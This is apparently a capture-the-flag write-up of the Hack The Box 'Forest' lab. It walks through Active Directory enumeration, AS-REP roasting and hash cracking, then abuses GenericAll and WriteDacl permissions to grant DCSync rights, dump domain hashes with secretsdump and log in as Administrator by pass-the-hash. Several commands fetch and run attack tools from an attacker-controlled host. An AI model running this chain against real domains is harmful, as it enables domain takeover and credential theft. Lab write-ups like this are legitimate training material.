# Forest

Forest is a easy HTB lab that focuses on active directory, disabled kerberos pre-authentication and privilege escalation. In this walkthrough, we will go over the process of exploiting the services and gaining access to the root user.

### Recon

The first step in any penetration testing process is reconnaissance. We can start by running nmap scan on the target machine to identify open ports and services.

```
[★]$ sudo nmap -p- -sV -sC 10.129.13.212

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-06 09:02 GMT
Nmap scan report for 10.129.13.212
Host is up (0.017s latency).
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-06 09:10:42Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49681/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
57183/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-01-06T09:11:31
|_  start_date: 2024-01-06T08:57:08
|_clock-skew: mean: 2h46m49s, deviation: 4h37m09s, median: 6m48s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-01-06T01:11:33-08:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 130.16 seconds
```

Adding new domains to `/etc/hosts`. `sudo tee --append /etc/hosts <<< "10.129.13.212 dc.htb.local htb.local"`

Enumerating the LDAP data:
```
$ ldapsearch -x -H ldap://10.129.13.212 -b "dc=htb,dc=local"
$ ldapsearch -x -H ldap://10.129.13.212 -b "dc=htb,dc=local" | grep sAMAccountName

$ rpcclient -N -U '' 10.129.13.212
rpcclient $> querydispinfo
index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA	Name: (null)	Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator	Name: Administrator	Desc: Built-in account for administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy	Name: Andy Hislip	Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1	Name: HealthMailbox-EXCH01-010	Desc: (null)
index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e	Name: HealthMailbox-EXCH01-003	Desc: (null)
index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678	Name: HealthMailbox-EXCH01-005	Desc: (null)
index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e	Name: HealthMailbox-EXCH01-009	Desc: (null)
index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781	Name: HealthMailbox-EXCH01-006	Desc: (null)
index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d	Name: HealthMailbox-EXCH01-004	Desc: (null)
index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64	Name: HealthMailbox-EXCH01-008	Desc: (null)
index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9	Name: HealthMailbox-EXCH01-002	Desc: (null)
index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722	Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013	Desc: (null)
index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad	Name: HealthMailbox-EXCH01-001	Desc: (null)
index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238	Name: HealthMailbox-EXCH01-007	Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda	Name: Lucinda Berger	Desc: (null)
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark	Name: Mark Brandt	Desc: (null)
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi	Name: Santi Rodriguez	Desc: (null)
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien	Name: Sebastien Caron	Desc: (null)
index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb	Name: Microsoft Exchange Migration	Desc: (null)
index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb	Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}	Desc: (null)
index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb	Name: Microsoft Exchange Approval Assistant	Desc: (null)
index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18	Name: Discovery Search Mailbox	Desc: (null)
index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a	Name: Microsoft Exchange	Desc: (null)
index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb	Name: E4E Encryption Store - Active	Desc: (null)
index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549	Name: Microsoft Exchange Federation Mailbox	Desc: (null)
index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b	Name: Microsoft Exchange	Desc: (null)
index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b	Name: Microsoft Exchange	Desc: (null)
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco	Name: svc-alfresco	Desc: (null)
```

### User

Using this information, we can create the user.txt . We can use this list to check which account do not have Kerberos pre-authentication disabled:
```
[★]$ GetNPUsers.py -usersfile users.txt -request -format hashcat -dc-ip 10.129.13.212 'htb.local/'
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
...
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
...
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
$krb5asrep$23$svc-alfresco@HTB.LOCAL:0fd9cf833e13e3bb64e0e1726176e386$33ae4feaba7de00ce4232cd4cf0fc864694ca6bf3b310baf93335269868fee0802b1a5eb4ce848876f3a4fef128900c88c0720e7be92f5e24d2fb6320b0b5dd07ba2a89655bb1df5c2709ff64c5899ebd3dcf7dc05abc4d2e86fde46d12a59a0309bfe98b46f11464530009c5d7bf837d13c76815446f1092d7257bbb04776142155dec4c6b2ddb92de25d06b9428df93bbb33090e253a8245d3cecfdd21b4dac636d96919c2c31953c973673382bdad680c9855bb1af1a11ee603da747ef1dbf3037e8561e6b75eca7c20c66d582df36325872506d10b7651ee21bd2dd474d20210e47b5943
```

Cracking hash with `$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt` and got password for username `svc-alfresco` as `***v***`.


Getting the flag:
```
[★]$ evil-winrm -i 10.129.13.212 -u svc-alfresco -p ***v***
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> type ..\Desktop\user.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```

### Privilege Escalation

Checking permissions:
```
*Evil-WinRM* PS C:\Users\svc-alfresco> net user /domain svc-alfresco
User name                    svc-alfresco
Full Name                    svc-alfresco
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/6/2024 1:30:38 AM
Password expires             Never
Password changeable          1/7/2024 1:30:38 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/6/2024 1:26:14 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Service Accounts
The command completed successfully.
```

Getting active directory graph using SharpHound
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> wget http://10.10.14.119:8000/SharpHound.exe -o SharpHound.exe
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> .\SharpHound.exe
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download "C:/Users/svc-alfresco/Documents/20240106013631_BloodHound.zip"
```
Using neo4j and bloodhound, got the following information to move forward.

svc-alfresco --MemberOf--> SERVICE ACCOUNTS@HTB.LOCAL --MemberOf--> PRIVILEGED IT ACCOUNTS@HTB.LOCAL --MemberOf--> ACCOUNT OPERATORS@HTB.LOCAL
ACCOUNT OPERATORS@HTB.LOCAL --GenericAll--> EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL --WriteDacl--> HTB.LOCAL

Searching for `GenericAll exploit`, found online - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericall-on-group
Effectively, this allows us to add ourselves (the user svc-alfresco) to the `EXCHANGE WINDOWS PERMISSIONS` group:
```
> net group "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco /add /domain
```

Searching for `WriteDacl exploit`, found online - https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse#abuse-writedacl
Setup:
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> wget http://10.10.14.119:8000/Powermad.ps1 -o Powermad.ps1; Import-Module .\Powermad.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> wget http://10.10.14.119:8000/PowerView.ps1 -o PowerView.ps1; Import-Module .\PowerView.ps1
```

Attack1 :
```
$ ldapsearch -x -H ldap://10.129.13.212 -b "DC=htb,DC=local"
$ python3 DCSync.py -dc dc.htb.local -t 'CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local'  'htb.local\svc-alfresco:s3rvice'
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Starting DCSync Attack against CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
[*] Initializing LDAP connection to dc.htb.local
[*] Using htb.local\svc-alfresco account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Querying domain security descriptor
[-] Error when updating ACL: {'result': 50, 'description': 'insufficientAccessRights', 'dn': '', 'message': '00000005: SecErr: DSID-03152870, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0\n\x00', 'referrals': None, 'type': 'modifyResponse'}
```

Attack2 :
```
> net user john s3rvice /add /domain
> net group "EXCHANGE WINDOWS PERMISSIONS" john /add /domain
> net localgroup "Remote Management Users" john /add
> $SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
> $Cred = New-Object System.Management.Automation.PSCredential('htb\john', $SecPassword)
> Add-ObjectAcl -Credential $Cred -PrincipalIdentity 'john' -Rights DCSync
```
Now we get the dump of the secrets:
```
$ secretsdump.py john:s3rvice@htb.local
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b************32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
...
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
...
```

Getting flag:
```
$ evil-winrm -i 10.129.13.212 -u administrator -H 32693b************32c72a07ceea6
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```
